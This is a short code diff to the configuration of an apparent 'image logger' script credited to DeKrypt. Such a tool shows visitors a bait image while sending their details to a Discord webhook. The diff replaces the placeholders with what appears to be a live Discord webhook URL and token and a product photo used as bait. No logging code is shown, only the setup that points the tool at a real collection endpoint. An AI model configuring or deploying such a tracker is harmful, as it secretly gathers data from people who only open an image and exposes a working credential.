@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1349648012783255564/IXuVvxFz5UWM19PMGd3IJjrYaL2fRcmcTFuJL88aFzVKAW-ZLD3VZ_wGFXXO0cXm2d9W",
+    "image": "https://novaclear.eu/wp-content/uploads/2022/08/novaclear-whiten-whitening-body-lotion-768x767.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
